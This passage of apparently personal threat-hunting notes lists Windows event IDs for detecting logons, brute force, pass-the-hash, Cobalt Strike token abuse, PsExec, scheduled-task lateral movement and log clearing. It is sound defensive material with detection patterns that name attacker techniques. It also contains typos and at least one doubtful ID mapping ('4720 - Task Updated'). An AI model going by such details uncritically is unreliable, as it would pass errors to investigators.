  - AutoStart Locations
  - Service Creation/Replacement
  - Service Failure Recovery
  - Scheduled Tasks
  - DLL Hijacking

### Profiling Account Usage (Hunting Artifact üèπ)
- Determine which accounts have been used for attempted logons
- Track account usage for known compromised accounts

**Event IDs**
- 4624: Successful Logon
- 4625: Failed Logon
- 4634/4647: Successful Logoff
- 4648: Logon using explicit credentials (RunAs)
- 4672: Account logon with superuser rights (Administrator)
- 4720/4726: An account was created/deleted

**Notes**
- Windows does not reliably record logoffs, also look for 4647 -> user initiated logoff for interactive logons
- Logon events are not recorded when backdoors, remote exploits, or similar malicous means are used to access a system

**Logon Types**  
2: Logon via console (keyboard, server KVM, or virtual client)  
3: Network logon (SMB and some RDP connections)  
4: Batch Logon -- Often used by Scheduled tasks  
5: Windows Service Logon  
7: Credentials used to lock or unlock screen; RDP session reconnect  
8: Network logon sending credentials in cleartext  
9: Different credentials used than logged on user -- RunAs/netonly  
10: Remote interactive login (Remote Desktop Protocol)  
11: Cached credentials used to log on  
12: Cached Remote Interactive (similar to Type 10)  
13: Cached unlock (similar to Type 7)  

**Identify Logon Sessions**
- Use Logon ID value to link a logon with a logoff and determine session length
- Useful for interactive logons (Type 2, 10, 11, 12)
- Can tie togther actions like special user privileges assigned to the session, process tracking, and object access
- Admin logins generate two different sessions
	- high privilege session
	- lower privlege session


### Brute Force Password Attack
- Logon Type 3 - Could SMB or RDP
- 1 accounts and many passwords = password guessing attack
- many accounts and few passwords = password spraying attack



### Built-In Accounts

- SYSTEM
	- Most powerful local account; unlimited access to system

- LOCAL SERVICE
	- Limited privileges similar to authenticated user account; can access only network resources via null session

- NETWORK SERVICE
	- Slightly higher privileges that LOCAL SERVICE; can access network resouces similar to authenticated user account

- HOSTNAME$
	- Every domain-joined windows system has a computer account

- DWM
	- Desktop window manager\Window manager group

- UMFD
	- Font driver host account

- ANONYMOUS LOGON
	- Null session w/o credentials use to authenticate with resource

**Notes**  
- Recommended to ignore in initial investigation (very noisy)



### Tracking Administrator Account Activity (Hunting Artifact üèπ)

- Event ID 4672
- Usually follows Event ID 4624 (Successful Logon)
- Important for:
	- Account auditing
	- Planning for password resets
	- Identifying compromised service accounts
- Scheduled tasks run with administrative privileges also trigger this



### Auditing Account Creation (Hunting Artifact üèπ)

- Event ID 4720
- Complementary events include
	- 4722: A user account was enabled
	- 4724: An attempt was made to reset an accounts password
	- 4728: A member was added to a security enabled global group
	- 4732: A member was added to a security enabled local group
	- 4735: A security enabled local group was changed
	- 4738: A user account was changed
	- 4756: A member was added to a security enabled universal group



### Remote Desktop Activity (Hunting Artifact üèπ)

- Event ID 4778 (Session Reconnected)
	- Should see 4624 (Successful logon) simultaneously
	- Session name contains "RDP"
	- Client Name: True Client Hostname (regardless of hops)
- Event ID 4779 (Session Disconnected)
	- Should see 4647 (Successful logoff) simultaneously
- Not a reliable indicator of all RDP activity (records reconnects)
	- Fill in gaps with Event ID 4624 Type 3,7,10 Events
- Logs provide IP address and hostname
- False positive: Shared workstations (fast user switching)
	- Session Name: Console
- Source System
	- Security
		- 4648: Logon with alternate credentials
			- Current logged on username
			- Alternate user name
			- Destination hostname/ip
			- Process Name
	- TerminalServices-RdpClient
		- 1024
			- Destination hostname
		- 1102
			- Destination IP
- Destination System
	- Security
		- 4624 Type 10
			- Source IP/Logon Username
		4778/4779
			- IP address of source/source system name
			- Logon Username
	- Remote Desktop Services-RDPCoreTS
		- 131 - Connection attempts
			- Source ip/logon username
		- 98 - Successful connections
	- TerminalServices Remote Connection Manager
		- 1149
			- Source ip/logon user name
				- Blank may indicate use of sticky keys
	- Terminal Services LocalSession Manager
		- 21,22,25
			- Source IP, Logon username
		- 41
			- Logon Username
- 4624 Type 7
	- Often Unlock or RDP Reconnect


### Privileged Local Account Abuse - Pass the Hash

- Filter event logs for Event ID 4776 (exclude Domain Controllers)
- Identify any workstations with these events
- Note Source Workstation, if Source Workstation doesn't match source of log activity is taking place remotely
- Review events surrounding 4776
	- 4624 (succesful logon)
		- Type 3 often indicative of share mapping or exceuting code with PsExec
	- 4672 - Privelged logon
	- 5140 - File Share event



### Account and Group Enumeration

- Event ID 4798: A user's local group was enumerated
- Event ID 4799: A security-enabled local group membership was enumerated


### Lateral Movement - Network Shares (Hunting Artifact üèπ)

- Event Id 5140: Network share was accessed
- Event Id 5145: Share object accessed (detailed file share auditing)


### Lateral Movement - Explicit Credentials - runas (Hunting Artifact üèπ)

- Track credential chagne common during lateral movement
- Event Id: 4624 (Logon Type 9)
- Event Id: 4648 (Logon using explicit credentials)

**Notes**
- Changing credentials necessary to move from system to system
- Typically only admins and attacks juggle multiple credentials
- 4648 events log on the originating system and help to identify attacker lateral movement from that system
- Logged if explicit credentials are supplied (even if no account change)
- RDP connections using different credentials often log 4648 events on both systems

**Detection**
- Originating Host - Event Id 4648
	- Subject
		- Account Name: Intitial Account Name
	- Account Whose Credentials Were Used
		- Account Name: "run as" account name
	- Target Server
		- Target Server Name: Remote Target
- Target System - Event Id 5140
	- Account Name: Should match account name of "Account Whose Credentials Were Used" from orginating host 4648 log
	- Source Address: Source IP of originating host
	- Share Name: Share accessed (IPC$, etc)
	- Computer: Computer name of remote host

**Cobalt Strike - Make Token or Pass the hash**

- EventID 4624
	- Logon Type 9 (explicit credentials)
	- "Subject - Account Name" matches "New Logon - Account Name"
	- Note Process information



- EventId 4648 (explicit credentials)
	- "Subject - Account Name" mathces "Account Whose Credentials Were Used - Account Name"
	- Note Target Server Name



### Lateral Movement - Scheduled Tasks

- Log: Task Scheduler - Security
	- 106 - 4698 - Task Created
	- 140 - 4720 - Task Updated
	- 141 - 4699 - Task Deleted
- Task Scheduler
	- 200/201: Task Executed/Completed
- Security
	- 4700/4701: Task Enabled/Disabled

**Notes**
- Tasks can be executed locally and remotely
	- Remotely scheduled task also cause Logon (ID 4624) Type 3 events
- Attackers commonly delete scheduled tasks after execution
	- Hunt deleted tasks (rare)
- Tasks running executables from /Temp likey evil

**Task Scheduler Artifacts**
- XML Files
- Saved in:
	- \Windows\System32\Tasks
	- \Windows\SysWOW64\Tasks
- Includes:
	- Task Name
	- Registration date and time (local)
	- Account used to register
	- Trigger conditions and frequency
	- Full command path
	- Account authenticated to run task



### Suspicious Services

- Analyze logs for suspicious services running at boot time
	- Service type changed to Boot
- Review services started and stopped during time of a suspected hack



- System Log
	- 7034: Service Crashed Unexpectedly
	- 7035: Service sent a Start/Stop control
	- 7036: Service started or stopped
	- 7040: Start typed changed (Boot, On Request, Disabled)
	- 7045: A new service was installed on the system (Win2008R2+)
- Security Log
	- 4697: A new service was installed on the system



**Notes**
- A large amount of malware and worms in the wild utilize Services
- Services started on bot illustrate peristence
- Services can crash due to attacks like process injections



**Example - PsExec**
- Filter by 7045 (New service installed)
- Look for services not tied to Built-In accounts (SIDs)
- Everytime PsExec runs, it starts a brand new service
- Note service File Name



### Event Log Clearing
- 1102: Audit Log Cleared (Security)
- 104: Audit Log Cleared (System)
